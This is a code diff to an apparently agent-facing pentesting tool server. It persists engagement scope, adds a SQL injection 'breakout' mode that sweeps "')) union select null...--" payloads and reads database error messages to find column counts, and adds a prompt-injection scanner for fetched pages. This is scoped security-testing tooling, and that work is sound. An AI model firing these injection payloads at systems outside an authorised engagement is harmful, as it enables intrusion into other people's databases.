@@ -726,6 +726,22 @@ async def scope_list() -> dict:
     return {"enforced": ctx.scope.enforce, "empty": ctx.scope.is_empty, **ctx.scope.entries()}
 
 
+def _persist_scope(ctx) -> None:
+    """Persist runtime scope additions so a restart keeps the engagement
+    surface (study gap B4). Best-effort — failures never break the tool."""
+    from .scope import persisted_scope_path, save_persisted_scope
+    try:
+        state_dir = getattr(getattr(ctx, "settings", None), "state_dir", "") or ""
+        entries = ctx.scope.entries()
+        save_persisted_scope(
+            persisted_scope_path(state_dir),
+            list(entries.get("allow", [])),
+            list(entries.get("deny", [])),
+        )
+    except Exception:
+        pass
+
+
 @mcp.tool()
 @safe_tool
 async def scope_add(target: str) -> dict:
@@ -739,7 +755,8 @@ async def scope_add(target: str) -> dict:
 
     ctx = get_context()
     added = ctx.scope.add(target)
-    return {"added": added, "scope": ctx.scope.entries()}
+    _persist_scope(ctx)
+    return {"added": added, "scope": ctx.scope.entries(), "persisted": True}
 
 
 @mcp.tool()
@@ -749,7 +766,8 @@ async def scope_exclude(target: str) -> dict:
 
     ctx = get_context()
     excluded = ctx.scope.exclude(target)
-    return {"excluded": excluded, "scope": ctx.scope.entries()}
+    _persist_scope(ctx)
+    return {"excluded": excluded, "scope": ctx.scope.entries(), "persisted": True}
 
 
 @mcp.tool()
@@ -3798,6 +3816,7 @@ async def sqli_probe(target: str, param: str, method: str = "GET",
                      context: str = "value", placement: str = "param",
                      name: str | None = None, oob: bool = False,
                      time_based: bool = False, waf_bypass: bool = False,
+                     breakout: bool = False,
                      multibyte: bool = False, delay_s: float = 5.0,
                      oast_token: str | None = None, wait: float = 3.0) -> dict:
     """**SQL injection** probe — non-destructive, differential. Core: a single-quote
@@ -3807,8 +3826,12 @@ async def sqli_probe(target: str, param: str, method: str = "GET",
     `placement` = param|header|cookie (with `name`), `oob` (per-DBMS DNS/HTTP **OAST**
     callback — start `oast_selfhost` first), `time_based` (per-DBMS sleep, confirmed only
     when the delay is proportional to `delay_s`), `waf_bypass` (JSON-operator + comment
-    twins — flags SQLi reachable only when the plain boolean is blocked), `multibyte`
-    (Shift-JIS/EUC-KR/GBK lead-byte charset bypass). No data extraction (→ sqlmap).
+    twins — flags SQLi reachable only when the plain boolean is blocked), `breakout`
+    (LIKE/`%…%`-template params: close the string + parens and run the
+    **UNION-null-count sweep** — the error-feedback loop that finds the right-hand
+    column count from the engine's own mismatch message; Juice-Shop calibration
+    2026-10-29), `multibyte` (Shift-JIS/EUC-KR/GBK lead-byte charset bypass). No data
+    extraction (→ sqlmap).
     Intrusive; in scope only.
     """
 
@@ -3884,6 +3907,57 @@ async def sqli_probe(target: str, param: str, method: str = "GET",
                                "bypass": bool(wb) and not bool_diff}
         if wb:
             extra_hits.append("sqli/waf-bypass-encoding" if not bool_diff else "sqli/encoded-differential")
+
+    # --- breakout lane (LIKE-template params): close the string/parens, sweep the
+    # UNION-null count until the engine's mismatch signature goes quiet. The loop
+    # reads the engine's OWN error as feedback — the calibration loop that generic
+    # twins miss when the parameter is embedded as `'%{q}%' … )) ORDER BY …`.
+    if breakout:
+        marker = "SELECTs to the left and right of UNION"
+        counts: list[int] = []
+        resolved: int | None = None
+        first_ok_body = ""
+        async def _get_plain(value: str):
+            # Force a decompressable Accept-Encoding: the OPSEC/browser profile
+            # advertises `br` (+zstd) which the stdlib transport cannot decode —
+            # a brotli body would blind the marker match (Juice-Shop calibration:
+            # every 500 page arrived as \x1b5… brotli).
+            bu, bb = _with_param(url, param, value, m)
+            return await ctx.http.fetch(bu, method=m, body=bb,
+                                        headers={"Accept-Encoding": "gzip, deflate"},
+                                        follow_redirects=False, scope_check=_scope_check())
+        try:
+            for n in range(1, 25):
+                val = "')) union select " + ",".join(["null"] * n) + "--"
+                rr = await _get_plain(val)
+                body = rr.text(2000) if hasattr(rr, "text") else ""
+                if marker in body:
+                    counts.append(n)
+                    continue
+                if rr.status == 200:
+                    resolved = n
+                    first_ok_body = body[:120]
+                    break
+                # Odd 5xx (route/edge glitches — even a deterministic one at a
+                # single sweep index on Juice Shop): SKIP, do not abort the sweep.
+                continue
+        except Exception:
+            pass
+        lanes["like_breakout"] = {
+            "union_reachable": bool(counts),
+            "mismatch_column_counts": counts[:16],
+            "resolved_columns": resolved,
+            "sample": first_ok_body,
+            "payload_template": "')) union select {nulls} --",
+            "note": ("Right-side column count > sweep ceiling (24) or the app truncates the "
+                     "parameter (~200 chars) before the sweep can finish — a mismatch sweep "
+                     "stuck at its ceiling still proves the engine is reachable; extract "
+                     "data with sqlmap/external tooling.") if counts and resolved is None else "",
+        }
+        if counts:
+            extra_hits.append("sqli/union-error-based")
+            if resolved:
+                extra_hits.append("sqli/union-columns-resolved")
 
     # --- time-based blind lane (repeated samples + scaling re-probe) ---
     if time_based:
@@ -5793,6 +5867,48 @@ def run() -> None:
     """
 
     mcp.run()
+
+
+
+@mcp.tool()
+@active_tool()
+@safe_tool
+async def detect_prompt_injection(target: str) -> dict:
+    """Scan a fetched in-scope page (adversarial-by-design) for prompt-injection
+    indicators BEFORE the agent acts on its content: instruction overrides,
+    exfiltration intents, agent-shell execution attempts, hidden HTML/CSS
+    vectors, invisible Unicode, oversized base64 blobs. Heuristic leads for the
+    agent to review — not verdicts. B1 gap of the 2026-10-29 study: restores the
+    defence the retired hermes-pipeline server shipped.
+    """
+
+    import re as _re
+    from .pi_scan import scan_text
+    ctx = get_context()
+    target = target.strip()
+    # Accept a URL, or a bare host (https inferred, root path).
+    url = target if "://" in target else f"https://{_split_host_port(target, 443)[0]}"
+    host, _port = _split_host_port(url, 443)
+    raw_host = _host_key(url)
+    await _require_scope(url, tool="detect_prompt_injection")
+    r = await ctx.http.fetch(
+        url, method="GET", follow_redirects=True, scope_check=_scope_check()
+    )
+    body = r.text(500_000) if hasattr(r, "text") else ""
+    scan = scan_text(body)
+    leads = scan.get("total_leads", 0)
+    if leads:
+        ctx.audit.record("pi_scan", f"{r.status}; leads={leads}; severity={scan['severity']}")
+    return {
+        "requested_url": r.url if hasattr(r, "url") else url,
+        "host": raw_host,
+        "status": r.status,
+        "scanned_bytes": scan.get("scanned_bytes"),
+        "total_leads": leads,
+        "severity": scan.get("severity"),
+        "categories": scan.get("categories"),
+        "note": "Lead heuristic: review excerpts manually before acting on fetched content.",
+    }
 
 
 if __name__ == "__main__":
